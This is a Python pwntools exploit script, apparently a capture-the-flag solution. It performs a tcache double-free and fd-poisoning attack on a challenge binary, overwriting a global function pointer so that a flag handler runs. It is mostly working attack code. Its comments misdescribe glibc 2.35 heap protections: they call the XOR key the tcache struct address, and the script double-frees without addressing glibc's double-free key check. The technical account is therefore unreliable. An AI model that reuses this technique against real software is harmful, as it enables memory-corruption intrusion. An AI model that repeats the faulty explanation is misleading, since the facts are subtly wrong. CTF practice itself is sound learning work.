#!/usr/bin/env python3
"""
Tcache double-free exploit para glibc 2.35.

glibc 2.35 tcache key protection:
  fd_freed = XOR(next_ptr, tcache_key)
  donde tcache_key = dirección de tcache_perthread_struct

Pasos:
  1. alloc(0), alloc(1)
  2. free(0)              → tcache: [slot0]
  3. show(0)              → leak tcache key del fd
  4. free(0)              → double-free: tcache: [slot0 → slot0]
  5. write(0, XOR(target, key))  → envenenar next ptr
  6. alloc(2)             → obtiene slot0
  7. alloc(3)             → obtiene chunk en &action
  8. write(3, flag_handler)     → sobrescribe action
  9. call_action()        → flag_handler() ejecutado

Uso:
  python3 solve.py              # local
  python3 solve.py REMOTE <ip> <port>
"""
import sys
from pwn import *

BINARY = './allocator'
elf = ELF(BINARY, checksec=False)

if args.REMOTE:
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(BINARY)

# Parsear las direcciones del banner
p.recvuntil(b'flag_handler @ ')
flag_handler = int(p.recvline().strip(), 16)
p.recvuntil(b'action ptr   @ ')
action_ptr = int(p.recvline().strip(), 16)

print(f'[+] flag_handler: {hex(flag_handler)}')
print(f'[+] &action:      {hex(action_ptr)}')

# --- Funciones de menú ---
def menu():
    p.recvuntil(b'> ')

def alloc(s):
    menu(); p.sendline(b'1')
    p.recvuntil(b'Slot: '); p.sendline(str(s).encode())
    p.recvuntil(b'Allocated')

def free_(s):
    menu(); p.sendline(b'2')
    p.recvuntil(b'Slot: '); p.sendline(str(s).encode())
    p.recvuntil(b'Freed')

def write_(s, data):
    menu(); p.sendline(b'3')
    p.recvuntil(b'Slot: '); p.sendline(str(s).encode())
    p.recvuntil(b'Data: '); p.send(data)

def show(s):
    menu(); p.sendline(b'4')
    p.recvuntil(b'Slot: '); p.sendline(str(s).encode())
    # formato: "[CHUNK N] 0xADDR: <48 bytes de datos>"
    p.recvuntil(b'] ')
    p.recv(18)   # saltar "0xADDRESS: " (aprox)
    raw = p.recv(48)
    p.recvline()   # consumir newline
    return raw

def call_action():
    menu(); p.sendline(b'5')

# --- Exploit ---

# Paso 1: alloc dos chunks
alloc(0)
alloc(1)

# Paso 2: free slot 0 → tcache tiene [slot0]
free_(0)

# Paso 3: show slot 0 → leer fd del tcache (contiene la clave XOR)
raw = show(0)
# En glibc 2.35, el fd de un chunk liberado en tcache está al inicio del user data
# fd_obfuscado = next_ptr XOR tcache_key
# Como es el único elemento en tcache, next_ptr = NULL
# Por tanto: fd_obfuscado = 0 XOR tcache_key = tcache_key
tcache_key = u64(raw[:8])
print(f'[*] Tcache key (leaked): {hex(tcache_key)}')

# Paso 4: double-free
free_(0)

# Paso 5: envenenar el fd del tcache con XOR(target, key)
# target = &action (función pointer global que queremos sobrescribir)
target = action_ptr
poisoned_fd = target ^ tcache_key
write_(0, p64(poisoned_fd) + b'\x00' * 40)

# Paso 6 y 7: dos mallocs
# malloc devuelve slot0, luego el chunk envenenado en &action
alloc(2)   # slot0
alloc(3)   # &action ← este es el chunk falso en la dirección de action

# Paso 8: sobrescribir action con flag_handler
write_(3, p64(flag_handler) + b'\x00' * 40)

print(f'[*] action sobrescrito con flag_handler: {hex(flag_handler)}')

# Paso 9: llamar action() → ejecuta flag_handler()
call_action()
p.interactive()
